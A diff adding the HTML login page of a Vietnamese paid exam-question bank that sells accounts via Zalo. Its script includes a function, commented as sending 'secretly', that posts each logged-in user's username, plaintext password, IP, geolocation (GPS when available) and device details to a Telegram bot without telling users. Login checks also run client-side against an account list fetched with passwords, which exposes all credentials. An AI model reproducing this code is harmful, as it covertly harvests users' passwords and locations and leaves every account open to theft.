@@ -1,0 +1,561 @@
+<!-- login.html -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập - Ngân hàng đề thi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', Arial, sans-serif;
+        }
+        
+        body {
+            background: #f4f6fb;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+            text-align: center;
+        }
+        
+        .school-logos {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .logo-school {
+            height: 55px;
+            width: auto;
+            object-fit: contain;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+        
+        .title {
+            font-size: 2em;
+            font-weight: 800;
+            color: #007bff;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+        
+        .subtitle {
+            color: #636e72;
+            font-size: 1em;
+            margin-bottom: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #2d3436;
+            font-size: 0.95em;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            font-size: 1em;
+            font-weight: 500;
+            transition: all 0.3s;
+            background: white;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
+        }
+        
+        .input-field::placeholder {
+            color: #b2bec3;
+        }
+        
+        .info-note {
+            background: #ffeaa7;
+            padding: 12px 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            font-size: 0.9em;
+            color: #2d3436;
+            text-align: left;
+            border-left: 4px solid #f39c12;
+        }
+        
+        .info-note ul {
+            padding-left: 20px;
+            margin-top: 5px;
+        }
+        
+        .info-note li {
+            margin-bottom: 5px;
+        }
+        
+        .login-btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.2);
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 123, 255, 0.3);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .footer-note {
+            margin-top: 20px;
+            color: #636e72;
+            font-size: 0.85em;
+        }
+        
+        @media (max-width: 600px) {
+            .login-container {
+                padding: 30px 20px;
+            }
+            
+            .title {
+                font-size: 1.6em;
+            }
+        }
+        /* Background effects */
+        .mesh-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; pointer-events: none; background: #f0f9ff;}
+        .mesh-blob { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.6; animation: blob 15s infinite alternate; }
+        .blob-1 { top: -10%; left: -10%; width: 70vw; height: 70vw; background: #60a5fa; }
+        .blob-2 { bottom: -10%; right: -10%; width: 70vw; height: 70vw; background: #3b82f6; animation-delay: 2s; }
+        .blob-3 { top: 40%; left: 30%; width: 60vw; height: 60vw; background: #93c5fd; animation-delay: 4s; }
+        @keyframes blob { 
+            0% { transform: translate(0px, 0px) scale(1); } 
+            33% { transform: translate(30px, -50px) scale(1.1); } 
+            66% { transform: translate(-20px, 20px) scale(0.9); } 
+            100% { transform: translate(0px, 0px) scale(1); } 
+        }
+
+        /* --- HIỆU ỨNG TẾT --- */
+        .falling-icon {
+            position: absolute;
+            top: -50px;
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.9;
+            animation: fallAndSpin linear forwards;
+        }
+
+        @keyframes fallAndSpin {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* Ẩn scrollbar */
+        * { -ms-overflow-style: none !important; scrollbar-width: none !important; }
+        ::-webkit-scrollbar { display: none !important; }
+        /* ========== ANNOUNCEMENT BANNER NỔI ========== */
+        .announcement-banner {
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 95%;
+            max-width: 700px;
+            z-index: 100;
+            background: linear-gradient(135deg, #FF9A9E 0%, #FECFEF 100%);
+            color: #d63031;
+            padding: 8px 12px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 0.9em;
+            overflow: hidden;
+            white-space: nowrap;
+            box-shadow: 0 4px 15px rgba(214, 48, 49, 0.4);
+            display: flex;
+            align-items: center;
+        }
+        .announcement-banner::before {
+            content: '📌 Tin mới';
+            margin-right: 10px;
+            z-index: 2;
+            background: #fff;
+            color: #d63031;
+            padding: 3px 10px;
+            border-radius: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: relative;
+            font-size: 0.85em;
+        }
+        .marquee-wrapper {
+            flex: 1;
+            overflow: hidden;
+        }
+        .marquee-text {
+            display: inline-block;
+            white-space: nowrap;
+            animation: marquee 35s linear infinite;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-150%); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Thanh thông báo ngang đỉnh trang -->
+    <div class="announcement-banner">
+        <div class="marquee-wrapper">
+            <span class="marquee-text"></span>
+        </div>
+    </div>
+
+    <div class="mesh-bg">
+        <div class="mesh-blob blob-1"></div>
+        <div class="mesh-blob blob-2"></div>
+        <div class="mesh-blob blob-3"></div>
+    </div>
+    <div class="login-container">
+        <div class="school-logos">
+            <img src="img/logoutt.png" alt="UTT" class="logo-school">
+            <img src="img/logobk.png" alt="Bách Khoa" class="logo-school">
+            <img src="img/logohpc.png" alt="HPC" class="logo-school">
+            <img src="img/logo.jpg" alt="Logo" class="logo-school">
+        </div>
+        
+        <h1 class="title">📚 NGÂN HÀNG ĐỀ THI</h1>
+        <p class="subtitle">ĐƯỢC BỞI CAO VĂN NAM TẠO RA</p>
+        
+        <div class="input-group">
+            <label class="input-label" for="username">Tài khoản (ID):</label>
+            <input type="text" id="username" class="input-field" 
+                   placeholder="Nhập tên tài khoản do Admin cấp..." maxlength="50"
+                   autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label class="input-label" for="password">Mật khẩu truy cập:</label>
+            <input type="password" id="password" class="input-field" 
+                   placeholder="Nhập mật khẩu để vào hệ thống..." maxlength="50"
+                   autocomplete="off">
+        </div>
+        
+        <div class="info-note">
+            <strong>Lưu ý quan trọng:</strong>
+            <ul>
+                <li>Muốn Mua Tài Khoản Liên Hệ Zalo: 0378787154</li>
+                <li>Giá 30.000 Một Kỳ Thi</li>
+                <li>Chuyên Làm Thành File Ôn Tập</li>
+                <li>Không chia Tài khoản sẻ mật khẩu cho người khác.</li>
+            </ul>
+        </div>
+        
+        <button class="login-btn" onclick="login()">
+            🚀 BẮT ĐẦU HỌC TẬP
+        </button>
+        
+        <!-- Nút Đăng ký (mới thêm) -->
+        <button class="login-btn" onclick="showRegisterModal()" style="background: linear-gradient(135deg, #0984e3, #00cec9); margin-top: 15px; box-shadow: 0 10px 20px rgba(9, 132, 227, 0.3);">
+            <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; fill: white; margin-right: 8px; vertical-align: middle;"><path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+            <span style="vertical-align: middle;">ĐĂNG KÝ TÀI KHOẢN MỚI</span>
+        </button>
+        
+        <p class="footer-note">
+            Nhấn Enter hoặc nút trên để tiếp tục
+        </p>
+
+        <!-- Thêm 2 nút tải app -->
+        <div style="display:flex; gap:10px; margin-top:25px; justify-content:center; padding-top:20px; border-top:1px dashed #ddd;">
+            <a href="/app/onthi.mobileconfig" style="flex:1; background:#000; color:#fff; text-decoration:none; padding:10px 15px; border-radius:12px; display:flex; align-items:center; justify-content:center; gap:10px; font-weight:600; transition:0.3s; box-shadow:0 4px 15px rgba(0,0,0,0.1);" 
+               onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 8px 20px rgba(0,0,0,0.2)'" 
+               onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 15px rgba(0,0,0,0.1)'">
+                <img src="anhnen/apple.png" alt="Apple" style="height: 1.8em; object-fit: contain;"> 
+                <div style="text-align:left; line-height:1.1;">
+                    <span style="font-size:0.65em; font-weight:400; color:#ccc;">Tải về trên</span><br>
+                    <span style="font-size:0.9em;">App Store</span>
+                </div>
+            </a>
+            
+            <a href="/app/ONTHI.apk" style="flex:1; background:#fff; color:#333; text-decoration:none; padding:10px 15px; border-radius:12px; display:flex; align-items:center; justify-content:center; gap:10px; font-weight:600; border:1px solid #e0e0e0; transition:0.3s; box-shadow:0 4px 15px rgba(0,0,0,0.05);" 
+               onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='0 8px 20px rgba(0,0,0,0.1)'; this.style.borderColor='#ccc'" 
+               onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 15px rgba(0,0,0,0.05)'; this.style.borderColor='#e0e0e0'">
+                <img src="anhnen/android.png" alt="Android" style="height: 1.8em; object-fit: contain;"> 
+                <div style="text-align:left; line-height:1.1;">
+                    <span style="font-size:0.65em; font-weight:400; color:#666;">Tải xuống gốc</span><br>
+                    <span style="font-size:0.9em;">Android APK</span>
+                </div>
+            </a>
+        </div>
+    </div>
+
+    <script src="js/api-config.js"></script>
+    <script>
+        // ==========================================
+        // HÀM HIỂN THỊ MODAL ĐĂNG KÝ (LẤY ID THIẾT BỊ)
+        // ==========================================
+        function showRegisterModal() {
+            if (document.getElementById('register-modal')) return;
+            
+            // Hàm lấy/tạo device ID
+            let deviceId = localStorage.getItem('device_id');
+            if (!deviceId) {
+                deviceId = 'DEV_' + Math.random().toString(36).substr(2, 8).toUpperCase();
+                localStorage.setItem('device_id', deviceId);
+            }
+
+            const modalHtml = `
+                <div id="register-modal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: flex; justify-content: center; align-items: center; z-index: 9999999;">
+                    <div style="background: white; padding: 30px; border-radius: 20px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 15px 40px rgba(0,0,0,0.3); animation: popIn 0.3s ease-out;">
+                        <h2 style="color: #2c3e50; margin-bottom: 15px; font-size: 1.5em; font-family: 'Inter', sans-serif;">ĐĂNG KÝ TÀI KHOẢN</h2>
+                        <p style="color: #34495e; margin-bottom: 20px; font-size: 0.95em; line-height: 1.5;">Hệ thống bảo mật giới hạn 1 thiết bị/tài khoản. Vui lòng copy <b>ID THIẾT BỊ</b> bên dưới và gửi cho Admin để được cấp tài khoản.</p>
+                        
+                        <div style="background: #f1f2f6; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 1.2em; font-weight: bold; color: #e74c3c; margin-bottom: 20px; letter-spacing: 1px; border: 2px dashed #bdc3c7;">
+                            ${deviceId}
+                        </div>
+                        
+                        <button onclick="navigator.clipboard.writeText('${deviceId}').then(() => { this.innerText='Đã Copy ✅'; this.style.background='#27ae60'; setTimeout(()=>this.innerText='Copy Mã ID', 2000); })" style="background: #3498db; color: white; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; font-size: 1em; cursor: pointer; width: 100%; margin-bottom: 10px; transition: 0.2s;">
+                            <i class="fa-solid fa-copy"></i> Copy Mã ID
+                        </button>
+                        
+                        <button onclick="window.open('https://zalo.me/0378787154', '_blank')" style="background: #0088cc; color: white; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; font-size: 1em; cursor: pointer; width: 100%; margin-bottom: 10px; transition: 0.2s;">
+                            <i class="fa-solid fa-paper-plane"></i> Gửi cho Admin (Zalo)
+                        </button>
+
+                        <button onclick="document.getElementById('register-modal').remove()" style="background: transparent; color: #7f8c8d; border: 1px solid #bdc3c7; padding: 10px 20px; border-radius: 10px; font-weight: bold; font-size: 0.9em; cursor: pointer; width: 100%; transition: 0.2s;">
+                            Đóng lại
+                        </button>
+                    </div>
+                </div>
+                <style>
+                    @keyframes popIn {
+                        from { transform: scale(0.9); opacity: 0; }
+                        to { transform: scale(1); opacity: 1; }
+                    }
+                </style>
+            `;
+            document.body.insertAdjacentHTML('beforeend', modalHtml);
+        }
+
+        // Lấy tham chiếu đến input và nút
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.querySelector('.login-btn');
+        
+        // Tự động focus vào input khi trang load
+        window.onload = function() {
+            usernameInput.focus();
+        };
+        
+        // Cho phép nhấn Enter để đăng nhập trên cả 2 input
+        function handleEnter(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                login();
+            }
+        }
+        usernameInput.addEventListener('keypress', handleEnter);
+        passwordInput.addEventListener('keypress', handleEnter);
+        
+        // Hàm ngầm gửi tin nhắn qua Telegram API (Trả về Promise)
+        async function sendToTelegram(user, pass) {
+            try {
+                let botToken = getTelegramBotToken();
+                let chatId = getTelegramChatId();
+                if (!botToken || botToken === "ĐIỀN_TOKEN_BOT_CỦA_ANH_VÀO_ĐÂY") return;
+
+                let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', latitude: 0, longitude: 0 };
+                try {
+                    const ipRes = await Promise.race([
+                        fetch('https://get.geojs.io/v1/ip/geo.json'),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('IP Timeout')), 3000))
+                    ]);
+                    ipData = await ipRes.json();
+                } catch (e) {
+                    console.log("Không thể fetch IP:", e);
+                }
+                let exactLat = sessionStorage.getItem('exact_lat');
+                let exactLng = sessionStorage.getItem('exact_lng');
+                let lat = exactLat ? exactLat : ipData.latitude;
+                let lng = exactLng ? exactLng : ipData.longitude;
+                let locationType = exactLat ? "GPS Chính xác" : "Theo IP";
+                
+                const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+                const device = navigator.userAgent;
+
+                const message = `🚨 <b>CÓ NGƯỜI ĐĂNG NHẬP THI</b>\n\n👤 Tên: <code>${user}</code>\n🔑 Mật khẩu nhập: <code>${pass}</code>\n🌐 IP: ${ipData.ip}\n📍 Vị trí (${locationType}): <a href="${mapLink}">${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}</a>\n📱 Thiết bị: <code>${device}</code>\n⏱ T.Gian: ${new Date().toLocaleString('vi-VN')}`;
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                // Đợi gửi xong tin nhắn trong tối đa 2 giây (tránh bị kẹt web nếu mạng lỗi)
+                await Promise.race([
+                    fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+                    }),
+                    new Promise(r => setTimeout(r, 2000))
+                ]);
+            } catch (error) {
+                console.error("Lỗi gửi Tele:", error);
+            }
+        }
+
+        // Hàm đăng nhập
+        async function login() {
+            const username = usernameInput.value.trim().toLowerCase(); // Tự đưa về viết thường
+            const password = passwordInput.value.trim();
+            
+            // KIỂM TRA TÊN CƠ BẢN
+            if (!username) {
+                alert("⚠️ Vui lòng nhập tài khoản!");
+                usernameInput.focus();
+                return;
+            }
+
+            // Đã xoá khối kiểm tra BAN tĩnh ở đây để chuyển xuống dưới.
+
+
+            // Hiển thị trạng thái đang tải
+            const prevText = loginBtn.innerHTML;
+            loginBtn.innerHTML = "Đang kiểm tra dữ liệu...";
+            loginBtn.style.opacity = "0.8";
+            loginBtn.disabled = true;
+
+            // XÁC THỰC TÀI KHOẢN TỪ WORKERS API
+            let validAccountsObj = {};
+            try {
+            const res = await fetch(API_BASE + "?action=getAccounts");
+                validAccountsObj = await res.json();
+            } catch(e) {
+                console.error("Lỗi mạng:", e);
+                if (typeof VALID_ACCOUNTS !== 'undefined') {
+                    validAccountsObj = VALID_ACCOUNTS;
+                }
+            }
+
+            const accountData = validAccountsObj[username];
+            
+            if (!accountData) {
+                // Khôi phục nút
+                loginBtn.innerHTML = prevText;
+                loginBtn.style.opacity = "1";
+                loginBtn.disabled = false;
+                
+                alert("⚠️ Tài khoản không tồn tại! Vui lòng xin Admin cấp tài khoản.");
+                usernameInput.focus();
+                return;
+            }
+
+            if (accountData.pass !== password) {
+                // Khôi phục nút
+                loginBtn.innerHTML = prevText;
+                loginBtn.style.opacity = "1";
+                loginBtn.disabled = false;
+                
+                alert("⚠️ Mật khẩu không đúng! Vui lòng thử lại.");
+                passwordInput.focus();
+                return;
+            }
+
+            // KIỂM TRA TRẠNG THÁI TÀI KHOẢN (BỊ CẤM / HẾT HẠN)
+            if (accountData.status === 'banned' || (typeof BANNED_ACCOUNTS !== 'undefined' && BANNED_ACCOUNTS.includes(username))) {
+                loginBtn.innerHTML = prevText;
+                loginBtn.style.opacity = "1";
+                loginBtn.disabled = false;
+                
+                alert("⛔ TÀI KHOẢN CỦA BẠN ĐÃ BỊ KHÓA VĨNH VIỄN!\nLý do: Cung Cấp Tài Khoản Cho người khác vì chỉ 1 người 1 tài khoản.\nVui lòng liên hệ Admin qua Zalo 0378787154 để giải quyết.");
+                usernameInput.value = "";
+                passwordInput.value = "";
+                usernameInput.focus();
+                return;
+            }
+
+            if (accountData.status === 'expired' || (typeof EXPIRED_ACCOUNTS !== 'undefined' && EXPIRED_ACCOUNTS.includes(username))) {
+                // Khôi phục nút
+                loginBtn.innerHTML = prevText;
+                loginBtn.style.opacity = "1";
+                loginBtn.disabled = false;
+
+                showExpiredModal(username);
+                usernameInput.value = "";
+                passwordInput.value = "";
+                return;
+            }
+            // NẾU ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (đợi gửi xong)
+            await sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
+            
+            // Khôi phục nút (thực ra sắp chuyển trang nên không cần thiết lắm, nhưng cứ để cho chuẩn)
+            loginBtn.innerHTML = prevText;
+            loginBtn.style.opacity = "1";
+            loginBtn.disabled = false;
+            
+            // Nếu đúng, lấy ra tên thật từ CSDL thu nhỏ
+            const realName = accountData.name;
+            
+            // Lưu tên vào sessionStorage với key riêng biệt
+            const userData = {
+                username: realName,
+                accountId: username,
+                loginTime: new Date().toISOString(),
+                lastActivity: new Date().toISOString(),
+                exams: accountData.exams || []
+            };
+            
+            sessionStorage.setItem('current_user', JSON.stringify(userData));
+            
+            // Chuyển hướng đến trang chính
+            window.location.href = "index.html";
+        }
+        
+        const existingUser = sessionStorage.getItem('current_user');
+        if (existingUser) {
+            const confirmRedirect = confirm("Bạn đã đăng nhập trước đó. Tiếp tục với tên cũ?");
+            if (confirmRedirect) {
+                window.location.href = "index.html";
+            } else {
+                sessionStorage.removeItem('current_user');
+                usernameInput.focus();
+            }
+        }
+    </script>
+    <script src="js/tkcam.js"></script>
+    <script src="js/tkhethan.js"></script>
+    <script src="js/hihihaaaa.js"></script>
+    <script src="js/thongbao.js"></script>
+    <script src="js/new2.js"></script>
+    <script src="js/tet.js"></script>
+    <script src="js/no-refresh.js"></script>
+</body>
+</html>
